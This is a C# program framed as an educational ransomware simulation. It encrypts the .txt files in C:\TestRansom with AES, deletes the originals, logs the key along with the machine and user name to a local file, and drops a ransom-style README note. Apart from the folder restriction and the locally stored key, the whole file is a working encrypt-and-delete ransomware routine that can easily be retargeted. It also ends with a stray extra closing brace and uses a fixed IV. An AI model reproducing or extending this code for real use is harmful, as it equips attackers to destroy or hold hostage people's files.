using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace FileEncrypter
{
    class Program
    {
        static string targetDir = @"C:\TestRansom";
        static string keyFile = @"C:\TestRansom\recovery_key.txt";
        static string noteFile = @"C:\TestRansom\README.txt";
        static string[] validExtensions = { ".txt" };

        static void Main(string[] args)
        {
            try
            {
                // Générer une clé aléatoire
                string key = GenerateKey();
                Console.WriteLine("Starting file encryption...");

                // Chiffrer les fichiers
                EncryptFiles(targetDir, key);

                // Enregistrer la clé
                SaveKey(key);

                // Créer une note de récupération
                CreateRecoveryNote();

                Console.WriteLine("Encryption completed. Check C:\\TestRansom for details.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
        }

        static string GenerateKey()
        {
            using (Aes aes = Aes.Create())
            {
                aes.GenerateKey();
                return Convert.ToBase64String(aes.Key);
            }
        }

        static void EncryptFiles(string directory, string key)
        {
            if (!Directory.Exists(directory))
            {
                throw new Exception($"Directory {directory} does not exist.");
            }

            foreach (string file in Directory.GetFiles(directory))
            {
                if (Array.Exists(validExtensions, ext => file.EndsWith(ext, StringComparison.OrdinalIgnoreCase)))
                {
                    try
                    {
                        byte[] fileContent = File.ReadAllBytes(file);
                        byte[] encryptedContent = EncryptData(fileContent, key);
                        File.WriteAllBytes(file + ".encrypted", encryptedContent);
                        File.Delete(file);
                        Console.WriteLine($"Encrypted: {file}");
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"Failed to encrypt {file}: {ex.Message}");
                    }
                }
            }
        }

        static byte[] EncryptData(byte[] data, string key)
        {
            using (Aes aes = Aes.Create())
            {
                aes.Key = Convert.FromBase64String(key);
                aes.IV = new byte[16]; // IV fixe pour simplifier (non recommandé pour production)
                using (var encryptor = aes.CreateEncryptor())
                {
                    return encryptor.TransformFinalBlock(data, 0, data.Length);
                }
            }
        }

        static void SaveKey(string key)
        {
            string info = $"Machine: {Environment.MachineName}, User: {Environment.UserName}, Key: {key}";
            File.AppendAllText(keyFile, info + Environment.NewLine);
            Console.WriteLine($"Key saved to {keyFile}");
        }

        static void CreateRecoveryNote()
        {
            string note = "Your .txt files in C:\\TestRansom have been encrypted for educational purposes.\n" +
                          "To recover your files, use the key in recovery_key.txt with a decryption tool.\n" +
                          "This is a simulation. No real harm was done.";
            File.WriteAllText(noteFile, note);
        }
    }
}
}
